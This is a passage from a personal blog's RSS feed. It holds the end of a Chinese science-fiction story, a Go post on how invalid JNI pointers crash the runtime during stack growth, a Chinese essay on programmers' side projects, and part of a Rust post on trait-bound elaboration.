>这个问题让我措手不及——老实说，我还没想过。我环顾四周，站台的地面一直延伸到很远，空间站银色的墙面随之而起，再往上，是一个巨大的天穹。我们置身于一个巨大的机械构件中，这是人类智慧的产物，是我日常生活所不能离开的。我身边的老人从太空拓荒的年代走来，在他和我一般年纪时，人们还生活在地球上，靠着现在看来原始的技术生存。再往前，当工业还没有出现时，人类已经以极低的水平生活了几千年。人类也许会不断犯错，人类也在不断进步。</p><p >“有的。”我回答。</p><p >“那就好。”曾祖父笑了笑。“去忙吧，孩子。我在这边自己逛一逛，逛累了自己回木星就好了。”</p><p >“您一个人可以吗？”我有点担心。</p><p >“放心吧，我对自己还是有信心的。”</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Fiction/">Fiction</category>
      
      
      <comments>https://i.hsfzxjy.site/human-sucks/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Invalid Golang Pointers Can Bite You Even If You Don&#39;t Dereference</title>
      <link>https://i.hsfzxjy.site/invalid-pointer-will-bite-you/</link>
      <guid>https://i.hsfzxjy.site/invalid-pointer-will-bite-you/</guid>
      <pubDate>Mon, 18 Apr 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;In Golang, if you coerce a &lt;code&gt;uintptr&lt;/code&gt; variable into &lt;code&gt;unsafe.Pointer&lt;/code&gt; (or further, to some &lt;code&gt;*T&lt;/code&gt;), the lin</description>
        
      
      
      
      <content:encoded><![CDATA[<p >In Golang, if you coerce a <code>uintptr</code> variable into <code>unsafe.Pointer</code> (or further, to some <code>*T</code>), the linter will warn with the message <code>&quot;possible miuse of unsafe.Pointer&quot;</code>. This makes sense because the <code>uintptr</code> variable may contain an address that points to a piece of invalid memory, and dereferencing such a pointer is catastrophic (usually aborts the program).</p><p >I was always aware of the above discipline, but I thought it would be OK to hold the pointers but not dereference them. This is true in C/C++, but not for Golang, which I did not realize until recently.</p><p >In fact, <strong>the program can panic even if you just keep an invalid pointer on the stack!</strong></p><h2 id="a-strange-invalid-pointer-panic">A strange invalid pointer panic</h2><p >The story back from an attempt of interoperation between Golang and JVM, when I was working on a Go-written dynamic library which need to operate bluetooth socket on Android. Android does not provide any native interfaces for bluetooth, so I had to call into JVM and invoke Java APIs.</p><p >I have learned JNI <sup id="fnref:1"><a href="#fn:1">1</a></sup> beforehand, which is an interface designed for interacting with JVM from native codes. Since JNI is provided to programmers as C++ header files, I had to seek a Golang binding. Then I noticed <a href="https://github.com/xlab/android-go">xlab/android-go</a> which, as utilities, encapsulates the full list of JNI types and functions. The project was out of maintenance for some while, but using only the JNI pieces should be fine.</p><p >With the help of xlab/android-go, I quickly finished a prototype of my library, so good, so far. I bundled the library into apk file, ran it on my phone, but unfortunately it crashed with the stack strace</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">runtime: bad pointer in frame kcore_android/bluetooth.ioWorker.Loop at 0x400018eeb0: 0x1</span><br><span class="line">fatal error: invalid pointer found on stack</span><br><span class="line"></span><br><span class="line">runtime stack:</span><br><span class="line">runtime.throw({0x7dbf000df2?, 0x7dbf19b4a0?})</span><br><span class="line">  /usr/local/go/src/runtime/panic.go:992 +0x50 fp=0x7d980b6c70 sp=0x7d980b6c40 pc=0x7dbf058ff0</span><br><span class="line">runtime.adjustpointers(0x7d980b7000?, 0x36581?, 0x7dbf164983?, {0x7dbf192338?, 0x7dbf19b4a0?})</span><br><span class="line">  /usr/local/go/src/runtime/stack.go:628 +0x1cc fp=0x7d980b6cb0 sp=0x7d980b6c70 pc=0x7dbf0716cc</span><br><span class="line">runtime.adjustframe(0x7d980b7000, 0x7d980b70f8)</span><br><span class="line">  /usr/local/go/src/runtime/stack.go:670 +0xa4 fp=0x7d980b6d40 sp=0x7d980b6cb0 pc=0x7dbf0717b4</span><br><span class="line">runtime.gentraceback(0x7d00001000?, 0x7d980b7140?, 0xffffff80ffffffe0?, 0x40001824e0, 0x0, 0x0, 0x7fffffff, 0x7dbf116168, 0x43?, 0x0)</span><br><span class="line">  /usr/local/go/src/runtime/traceback.go:330 +0x734 fp=0x7d980b7060 sp=0x7d980b6d40 pc=0x7dbf07b7d4</span><br><span class="line">runtime.copystack(0x40001824e0, 0x1000)</span><br><span class="line">  /usr/local/go/src/runtime/stack.go:930 +0x300 fp=0x7d980b7220 sp=0x7d980b7060 pc=0x7dbf071fa0</span><br><span class="line">runtime.newstack()</span><br><span class="line">  /usr/local/go/src/runtime/stack.go:1110 +0x37c fp=0x7d980b73d0 sp=0x7d980b7220 pc=0x7dbf0723fc</span><br><span class="line">runtime.morestack()</span><br><span class="line">  /usr/local/go/src/runtime/asm_arm64.s:314 +0x70 fp=0x7d980b73d0 sp=0x7d980b73d0 pc=0x7dbf084bc0</span><br><span class="line"></span><br><span class="line">goroutine 51 [copystack, locked to thread]:</span><br><span class="line">--- snip ---</span><br></pre></div></div><p  class="par"> I was not frightened, since no code would succeed in one go. But the error report did frustrate me from two perspectives</p><ol><li>It involved one of my stack frames (<code>kcore_android/bluetooth.ioWorker.Loop</code>), but the panic was thrown from some source code that lies out of my codebase (<code>runtime/stack.go</code>).</li><li>It was caused by an invalid pointer, whose value was <code>0x1</code>.</li></ol><p  class="par"> I guessed the pointer was returned from the Java side, for some unknown reason it had a wierd value of <code>0x1</code>. But what I didn’t understand is how it could crash my program. I have tried carefully to avoid dereferencing any non-Go pointer in my code.</p><p  class="nomargin"> Also, the mismatch between stack frame and source code made me really difficult to locate the problem. For a time I thought <code>goroutine 51</code> stopped at the scene where the pointer troubled, as its stack trace contained the aforementioned frame <code>bluetooth.ioWorker.Loop</code>, but it didn’t. In fact, the goroutine stopped at another line when I restarted the program! This was annoying.</p><p >It took me almost half a day to resolve and understand the problem. I will first explain the origin of the invalid pointer, and then show how it would crash the program.</p><h2 id="the-origin-of-0x1-pointer">The origin of <code>0x1</code> pointer</h2><p >In JNI, the C type <code>jobject</code> acts as a handle for Java object, which is technically an alias of <code>void*</code>. They can be created by calling most JNI functions like <code>JNIEnv-&gt;CallObjectMethod</code>.</p><p  class="nomargin"> Although being a pointer type, a <code>jobject</code> variable is not necessarily a valid pointer. To understand one should know that there exists two kinds of object references in JNI, <em>local reference</em> and <em>global reference</em>. Local references will be recycled at the end of a Java frame, while global references survive longer until you delete them.</p><p  class="nomargin"> They not only differ semantically, but practically diverse in values. Local references often contain smaller values like <code>0x01</code>, <code>0x75</code>, yet global references will have values like <code>0x7dbeffc1cf</code>. I guess local references are not actual pointers but indices of some internal object tables.</p><p  class="nomargin"> Symmetrically, xlab/android-go defines a <code>Jobject</code> which was an alias for <code>unsafe.Pointer</code>. So if you recieve a local reference from JNI functions, you are owning an invalid pointer at Go side.</p><h2 id="go-runtime-checks-invalid-pointers-during-stack-growth">Go runtime checks invalid pointers during stack growth</h2><p >What’s interesting is that, <strong>goroutines do not statically allocate their stack</strong>. Instead, they are able to grow or shrink the stack according to our needs. I will not dive into the details of this mechanism, which you may read from the article <a href="https://medium.com/a-journey-with-go/go-how-does-the-goroutine-stack-size-evolve-447fc02085e5">Go: How does the goroutine stack size evolve?</a> if you are interested.</p><p  class="nomargin"> My panic was thrown by an invalid pointer checking during stack growing. Why should the Go runtime check for invalid pointers here? Because growing a stack involves memory re-allocation, and the runtime must ensure no pointer is invalidated after the potential moving.</p><p  class="nomargin"> To see how a moving could invalidate pointers, let’s consider an example. Say we have a goroutine whose stack ranged in address space <code>0x8000 - 0x8800</code>. An integer <code>i int</code> was stored at <code>0x8000</code>, and a pointer <code>ptr *int</code> referenced to that <code>int</code> stored at <code>0x8004</code>, whose value is <code>0x8000</code>. Now we grow the stack by moving it to address space <code>0xA000 - 0xB000</code>. If <code>ptr</code> retains its old value, it will no longer point to <code>i</code> since <code>i</code> has been moved to <code>0xA000</code>! Therefore, during a stack growth, Go runtime must also check the existence for such pointers, and change their values accordingly.</p><p  class="nomargin"> However, the Go runtime does more than checking whether or not a pointer value falls in the old address space range. It also checks and complains about pointers with small values</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">adjustpointers</span><span class="hljs-params">(/*...*/)</span></span> {</span><br><span class="line">    <span class="hljs-comment">/* --- snip --- */</span></span><br><span class="line">    <span class="hljs-keyword">if</span> f.valid() &amp;&amp; <span class="hljs-number">0</span> &lt; p &amp;&amp; p &lt; minLegalPointer &amp;&amp; debug.invalidptr != <span class="hljs-number">0</span> {</span><br><span class="line">        <span class="hljs-comment">// Looks like a junk value in a pointer slot.</span></span><br><span class="line">        <span class="hljs-comment">// Live analysis wrong?</span></span><br><span class="line">        getg().m.traceback = <span class="hljs-number">2</span></span><br><span class="line">        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;runtime: bad pointer in frame &quot;</span>, funcname(f), <span class="hljs-string">&quot; at &quot;</span>, pp, <span class="hljs-string">&quot;: &quot;</span>, hex(p), <span class="hljs-string">&quot;\n&quot;</span>)</span><br><span class="line">        throw(<span class="hljs-string">&quot;invalid pointer found on stack&quot;</span>)</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-comment">/* --- snip --- */</span></span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The above snippet can be found at <a href="https://github.com/golang/go/blob/release-branch.go1.18/src/runtime/stack.go#L623">runtime/stack.go</a>. If a pointer value is less than <code>minLegalPointer</code> (which is <code>4096</code>), the runtime will also panic! And that’s the culprit for my case.</p><h2 id="conclusion-2">Conclusion</h2><p >Now I know that the panic comes from two aspects. First I have an invalid pointer due to FFI, although I don’t mean to dereference it. The Go runtime, however, does more than I thought behind the scene. It moves the goroutine stack when necessary, during which it checks and complains for invalid pointers.</p><p >This reminds me not to coerce foreign pointer-like values into Go pointers, if you won’t dereference them at the Go side. The safest practice is to keep them <code>uintptr</code>. As a solution, I patch and slim xlab/android-go into <a href="https://github.com/hsfzxjy/android-jni-go">hsfzxjy/android-jni-go</a>, which works like a charm.</p><p >I also create a minimal example to reproduce the above problem, for whom interested to investigate. In this example, the main goroutine stack will grow during the invocation of <code>foo() -&gt; bar() -&gt; baz()</code>, during which the Go runtime encounters the crafted pointer <code>ptr</code>, and eventually panics.</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> (</span><br><span class="line">    <span class="hljs-string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="hljs-string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">    <span class="hljs-keyword">var</span> a [<span class="hljs-number">10</span>]<span class="hljs-type">int</span></span><br><span class="line">    foo(a)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//go:noinline</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foo</span><span class="hljs-params">(a [10]<span class="hljs-type">int</span>)</span></span> {</span><br><span class="line">    <span class="hljs-keyword">var</span> b [<span class="hljs-number">100</span>]<span class="hljs-type">int</span></span><br><span class="line">    ptr := unsafe.Pointer(<span class="hljs-type">uintptr</span>(<span class="hljs-number">1</span>))</span><br><span class="line">    bar(b)</span><br><span class="line">    fmt.Printf(<span class="hljs-string">&quot;%p\n&quot;</span>, ptr)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//go:noinline</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">bar</span><span class="hljs-params">(a [100]<span class="hljs-type">int</span>)</span></span> {</span><br><span class="line">    <span class="hljs-keyword">var</span> b [<span class="hljs-number">1000</span>]<span class="hljs-type">int</span></span><br><span class="line">    baz(b)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//go:noinline</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">baz</span><span class="hljs-params">(a [1000]<span class="hljs-type">int</span>)</span></span> {}</span><br></pre></div></div><div class="footnotes"><ol><li class="footnote" id="fn:1"><a href="https://developer.android.com/training/articles/perf-jni">https://developer.android.com/training/articles/perf-jni</a></li></ol></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/FFI/">FFI</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Go/">Go</category>
      
      
      <comments>https://i.hsfzxjy.site/invalid-pointer-will-bite-you/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Side Project（副业）</title>
      <link>https://i.hsfzxjy.site/side-project/</link>
      <guid>https://i.hsfzxjy.site/side-project/</guid>
      <pubDate>Mon, 11 Apr 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;计算机从业者们似乎都喜欢写 side project，这在中文社区中有个通俗的说法即「搞副业」。如果你经常逛 V2EX、Reddit 的编程板块或是 Hacker News，你会看到人们分享的各种各样的 side project，小到一个百余行代码的实用小工具，大至一个框</description>
        
      
      
      
      <content:encoded><![CDATA[<p >计算机从业者们似乎都喜欢写 side project，这在中文社区中有个通俗的说法即「搞副业」。如果你经常逛 V2EX、Reddit 的编程板块或是 Hacker News，你会看到人们分享的各种各样的 side project，小到一个百余行代码的实用小工具，大至一个框架、一个网站乃至一个完整的准商业项目。</p><p >人们在分享自己的创造时往往怀着极大的热情。这是一种即使隔着屏幕也能感受到的心情，就像七岁的男孩组装好了第一辆四驱车，又或是料理爱好者凭自己的努力烧了一顿高难度的饭菜。他们分享的是自己的宝贝，并期望在人群中掀起波澜。在一些社区如 <a href="https://www.reddit.com/r/rust/">r/rust</a>，人们热衷于讨论这样的分享，给予肯定以及有意义的反馈。但事情并不总是如意，在另外一些地方，如综合性的或是冷门的社区，只有少数分享会被人们注意，更多的则是被略过，直至沉没在信息流中。这通常会令人沮丧。</p><p >人们怀着相似的心情分享创造，分享时的心态却又不尽相同。我偶尔会尝试透过文字猜测不同分享者的想法。发在新手区的帖子有一种年少的单纯。他们的分享并不复杂，往往是初尝某个领域后的练手项目。社区的成员通常也会以较低的标准对待这样的项目，给予鼓励，仿佛为刚学会走路的孩童喝彩。匆匆留下一个链接的，倘若不是社区不鼓励附言（如 Hacker News），极有可能是一位佛系人士。他们分享的往往是随手创造的项目，如从工作中抽象出的类库，或是某些能提升生活质量的工具。他们没有为此花费过多的精力，因此不会过于在意他人的看法。项目能够帮助他人当然是极好的，如果不能，他们也不会过度失落。但也有另一类人，他们在自己的项目中倾注了大量的心血，因此也希望从社区获得相当的回应。他们在行文中会极力为自己的项目卖好，有甚者更是不加掩饰地向社区索要点赞（如 Github 的 Star）。这些人属于分享创造的狂热者。</p><p >每种职业都有类似的现象。行业内人士自发形成圈子，以交流讨论行业的知识和技能。作家们相互赏阅评判各自的作品，厨师们举办茶会比拼自己的料理。但计算机从业者的热情尤为高涨。不论水平的高与低，工作的忙与闲，大家都热衷于写 side project。</p><p >Side project 首先是实用的，这由计算机从业者的性质决定。在信息化的时代中，他们是日常生活工具的锻造者，是数字世界的铁匠、木匠。计算机从业者的创造主题广泛而多样，从游戏到生产力工具软件，乃至一些智能硬件，无一不可解决切实的问题。但与传统世界的工匠不同，完成一个完整的作品并不需要诸多精细化分工的角色。一旦有了想法，一个人便可马上付诸行动，借助完善的文档快速地构建一个可用的原型。和其他行业相比，计算机从业者可以花费更少的资源完成一个项目。</p><p >计算机从业者们通常倡导终身学习，而完成 side project 是一个很好的学习机会。在工作中你也许只负责项目的一小方面，涉及的知识就像巨型人偶中的一颗螺丝。但在 side project 中，你会接触到项目的各个方面，从规划设计到技术实现再到落地部署，总有一些之前没有涉猎过的内容。抑或者业界有人推出了新的技术或框架，正好能用于实现你的想法，你便会去接近并尝试使用它们。有人说这么大的工程量也太费精力了，会使人身心俱疲。但对于极客而言，学习和折腾各种技术本身就是一件快乐的事情。</p><p >Side project 也是自豪感的一个重要来源。凭自己的力量创造一件事物，并用它来解决实际的问题，这本身就是一件了不得的事情。如果这个事物再被外人所知悉，那更是有超越造物主的自豪感——毕竟无人和造物主一起分享这种喜悦。自豪感不总是能轻易获得，却又是生活的必需品。如果你不能从工作中获得自豪感，你会更倾向于从 side project 中获得这种体验。</p><p >而更重要的是，网络及成熟的代码托管平台简化了 side project 的分享乃至协作。这是相较于其他行业的一个优势。经由网络，他人可方便地体验分享的作品，同时作品也可被快速传播。人们不仅能体验作品，很多时候也能了解到作品的实现细节。这要归功于开源文化的流行。创作者不仅会分享成品，也乐于分享成品的源代码，以供他人学习或是改进。而代码托管平台的使用已在计算机从业者间形成共识，人们可以在上面阅读项目的细节，或是和作者携手完成项目。这同样也是一件非常有意义而令人快乐的事情。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Soliloquy/">Soliloquy</category>
      
      
      
      <comments>https://i.hsfzxjy.site/side-project/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>A Flaw of Promoting Complex Trait Bounds in Rust</title>
      <link>https://i.hsfzxjy.site/a-bug-of-promoting-complex-trait-bounds-in-rust/</link>
      <guid>https://i.hsfzxjy.site/a-bug-of-promoting-complex-trait-bounds-in-rust/</guid>
      <pubDate>Tue, 29 Mar 2022 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Days ago, for some reason, I was trying to implement a function that can polymorphize over its return type. The solution is simple, but </description>
        
      
      
      
      <content:encoded><![CDATA[<p >Days ago, for some reason, I was trying to implement a function that can polymorphize over its return type. The solution is simple, but my brain was jammed at that time, trapped in some complicated typing tricks for hours.</p><p  class="nomargin"> During the struggling, I coincidently ran into something that is temporarily a flaw in the current Rust compiler implementation. In some cases, the compiler is not smart enough to promote known trait bounds, and we have to replicate them again and again. Although the problem is afterwards proved to be a useless “X-Y Problem”, I would still like to share the story.</p><h2 id="the-problem-2">The Problem</h2><p >Let’s say we are going to write a function that digests a given <code>&amp;[u8]</code> slice and computes a hash value. The function would adopt either of two different algorithms, and a <code>u64</code> or <code>u128</code> integer is returned as the hash result.</p><p  class="nomargin"> Trivially, this can be achieved by splitting into two functions <code>get_hash_u64()</code> and <code>get_hash_u128()</code>. But I prefer to have a single and unified interface, so concretely, I am expecting a function to polymorphize over its return type, with the following signature</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_hash</span>&lt;T&gt;(b: &amp;[<span class="hljs-type">u8</span>]) <span class="hljs-punctuation">-&gt;</span> T</span><br><span class="line">    <span class="hljs-keyword">where</span> <span class="hljs-comment">/* some bounds on T */</span></span><br><span class="line">{ todo!() }</span><br></pre></div></div><p  class="nomargin"> Two things I should fill in for the above snippet</p><ol><li>The <code>where</code>-clause. Some trait bounds might be satisfied for typevar <code>T</code>, and I expect them to be as concise as possible in order for less verbosity in callers.</li><li>The body. The function should behave differently regarding different typevar <code>T</code>.</li></ol><p  class="nomargin"> In order to emulate the effect of choosing different hashing algorithm, we expect a different numeric value be returnedwhen different typevar <code>T</code> supplied. Also, since the argument <code>b: &amp;[u8]</code> is irrelavant to our problem, I will omit it in the following text for brevity. So overall, I would like the two assertions to be held</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">assert_eq!</span>(get_hash::&lt;<span class="hljs-type">u64</span>&gt;(), <span class="hljs-number">42u64</span>);</span><br><span class="line"><span class="hljs-built_in">assert_eq!</span>(get_hash::&lt;<span class="hljs-type">u128</span>&gt;(), <span class="hljs-number">4242u128</span>);</span><br></pre></div></div><h2 id="the-simple-answer">The Simple Answer</h2><p >Before stepping far, I will place a simple and straight-forward solution at the front, in case of anybody taking the same wrong path.</p><p  class="nomargin"> Specifically, we can define a trait, say <code>HashVal</code>, as the upper bound of all possbile return types for <code>get_hash</code>.</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">HashVal</span>: <span class="hljs-built_in">Sized</span> {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">digest</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span>;</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> For each possible type such as <code>u64</code> or <code>u128</code>, we place corresponding hashing algorithm in <code>HashVal::digest</code></p><div class="gk-code hljs" data-gk-id="BLOCK4"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">HashVal</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">u64</span> {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">digest</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> { <span class="hljs-number">42u64</span> }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">HashVal</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">u128</span> {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">digest</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> { <span class="hljs-number">4242u128</span> }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_hash</span>&lt;T: HashVal&gt;() <span class="hljs-punctuation">-&gt;</span> T {</span><br><span class="line">    T::<span class="hljs-title function_ invoke__">digest</span>()</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> <code>get_hash&lt;T&gt;()</code> is now polymorphized over return type <code>T</code>. User might select a 64-bit hashing algorithm via a calling like <code>get_hash::&lt;u64&gt;()</code>.</p><p >This solution is neat and, most importantly, the prerequisite <code>T: HashVal</code> is concise and self-explained, which saves a lot of verbosity in callers’ <code>where</code>-clause. However, this didn’t come to my mind at that time. I alternatively choose a more complicated solution.</p><h2 id="the-complicated-answer">The Complicated Answer</h2><p >In this version, I start by a dummy struct <code>Hasher</code> and a trait <code>HashDispatcher&lt;T&gt;</code>.</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Hasher</span>;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">HashDispatcher</span>&lt;T&gt; {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">digest</span>() <span class="hljs-punctuation">-&gt;</span> T;</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> The struct <code>Hasher</code> implements <code>HashDispatcher&lt;T&gt;</code> for different type <code>T</code> with corresponding algorithm filled in <code>digest()</code> method</p><div class="gk-code hljs" data-gk-id="BLOCK6"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">HashDispatcher</span>&lt;<span class="hljs-type">u64</span>&gt; <span class="hljs-keyword">for</span> <span class="hljs-title class_">Hasher</span> {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">digest</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u64</span> { <span class="hljs-number">42u64</span> };</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">HashDispatcher</span>&lt;<span class="hljs-type">u128</span>&gt; <span class="hljs-keyword">for</span> <span class="hljs-title class_">Hasher</span> {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">digest</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">u128</span> { <span class="hljs-number">4242u128</span> };</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_hash</span>&lt;T&gt;() <span class="hljs-punctuation">-&gt;</span> T <span class="hljs-keyword">where</span> Hasher: HashDispatcher&lt;T&gt; {</span><br><span class="line">    Hasher::<span class="hljs-title function_ invoke__">digest</span>()</span><br><span class="line">}</span><br></pre></div></div><p  class="par"> Function <code>get_hash&lt;T&gt;()</code> delegates the calling to <code>Hasher::digest()</code>, which requires a verbose trait bound <code>Hasher: HashDispatcher&lt;T&gt;</code>. In order to reduce the boilerplate, I was seeking to write another trait, named also <code>HashVal</code>, such that <em>for all <code>T</code> being a <code>HashVal</code>, the trait bound <code>Hasher: HashDispatcher&lt;T&gt;</code> holds</em>, or formally $$\text{T: HashVal} \Rightarrow \text{Hasher: HashDispatcher&amp;lt;T&amp;gt;}$$. If achieved, the signature of <code>get_hash</code> can be largely deduced into</p><div class="gk-code hljs" data-gk-id="BLOCK7"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">get_hash</span>&lt;T: HashVal&gt;() <span class="hljs-punctuation">-&gt;</span> T;</span><br></pre></div></div><h2 id="the-incorrect-attempt-for-hashval">The Incorrect Attempt for HashVal</h2><p  class="noindent"> The first attempt I made was to place the bound in the <code>where</code>-clause of a generic <code>impl</code></p><div class="gk-code hljs" data-gk-id="BLOCK8"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">HashVal</span> {};</span><br><span class="line"><span class="hljs-keyword">impl</span>&lt;T&gt; HashVal <span class="hljs-keyword">for</span> <span class="hljs-title class_">T</span> <span class="hljs-keyword">where</span> Hasher: HashDispatcher&lt;T&gt; {}</span><br></pre></div></div><p  class="par"> I mistakenly thought this would fulfill my purpose. The statement instead should read as <em>“for every <code>T</code> that satisfies Hasher: HashDispatcher<T>, T is a HashVal”</em>, which delivers a different implication that <em>converses</em> to what I expect. Thank u/schungx for pointing out in the <a href="https://www.reddit.com/r/rust/comments/tq4ga9/comment/i2nsa5q/?utm_source=share&utm_medium=web2x&context=3">reddit thread</a>. As a counter-example, one is able to impl other types as <code>HashVal</code>, while without ensuring them to satisfy my bound</p><div class="gk-code hljs" data-gk-id="BLOCK9"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">HashVal</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">String</span> {}</span><br></pre></div></div><h2 id="the-correct-yet-flawed-attempt">The Correct yet Flawed Attempt</h2><p >u/SkiFire13 <a href="https://www.reddit.com/r/rust/comments/tq4ga9/comment/i2eyene/?utm_source=share&utm_medium=web2x&context=3">mentioned</a> that the trait bound should be placed at the definition of <code>HashVal</code> to meet my requirement like this</p><div class="gk-code hljs" data-gk-id="BLOCK10"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">HashVal</span> <span class="hljs-keyword">where</span> Hasher: HashDispatcher&lt;<span class="hljs-keyword">Self</span>&gt; {}</span><br></pre></div></div><p  class="par"> I have no memory of seeing a <code>where</code> clause in the trait definition before. The syntax is not introduced by “The Book”, but rather mentioned in <a href="https://rust-lang.github.io/rfcs/0135-where.html">the RFC of where clause</a>.</p><p ><code>where</code>-clause for trait is not a new concept. In fact, the “supertrait” bound can be regarded as a specialized version of <code>where</code>-style bound</p><div class="gk-code hljs" data-gk-id="BLOCK11"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">Foo</span>: Bar {}  <span class="hljs-comment">// is equivalent to</span></span><br><span class="line"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">Foo</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">Self</span>: Bar {}</span><br></pre></div></div><p  class="par"> More generally, the <code>where</code>-clause is used to elaborate the constraints that the typevars (or the special <code>Self</code>) should satisify. If <code>SomeT: Trait</code> holds, type <code>SomeT</code> should meet all the requirements in <code>Trait</code>‘s <code>where</code>-clause.</p><p  class="par"> As for our case, the <code>where</code>-clause grants an upper bound for <code>HashVal</code> – any type <code>T</code> implements <code>HashVal</code> should satisfy <code>Hasher: HashDispatcher&lt;T&gt;</code> beforehand, which is precisely our requirement.</p><p >With this declaration, however, we still cannot deduce the trait bound of <code>get_hash</code> to <code>T: HashVal</code>, due to the flaw of current compiler. A long discussion <a href="https://github.com/rust-lang/rust/issues/20671">“where clauses are only elaborated for supertraits, and not other things”</a> can be found on Github back in 2015.</p><p  class="nomargin"> In short words, except from some simple constraints like supertraits, the constraints in <code>where</code>-clause will <em>only be respected within the trait definition (to ensure some type-checks in the trait can pass), but not be promoted in other places.</em></p><div class="gk-code hljs" data-gk-id="BLOCK12"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">HashVal</span>: <span class="hljs-built_in">Sized</span> <span class="hljs-keyword">where</span> Hasher: HashDispatcher&lt;<span class="hljs-keyword">Self</span>&gt; {</span><br><span class="line">    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">foo</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {</span><br><span class="line">        <span class="hljs-comment">// OK. the &quot;where&quot; bound permits the casting</span></span><br><span class="line">        &lt;Hasher <span class="hljs-keyword">as</span> HashDispatcher&lt;<span class="hljs-keyword">Self</span>&gt;&gt;::<span class="hljs-title function_ invoke__">digest</span>()</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="hljs-keyword">impl</span>&lt;T: <span class="hljs-built_in">Sized</span>&gt; HashVal <span class="hljs-keyword">for</span> <span class="hljs-title class_">T</span> <span class="hljs-keyword">where</span> Hasher: 